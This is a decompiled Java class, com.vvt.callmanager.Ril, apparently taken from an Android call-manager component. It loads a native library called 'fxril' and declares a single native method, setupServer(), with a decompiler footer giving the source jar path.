package com.vvt.callmanager;

public class Ril
{
  static
  {
    System.loadLibrary("fxril");
  }
  
  public native int setupServer();
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/Ril.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */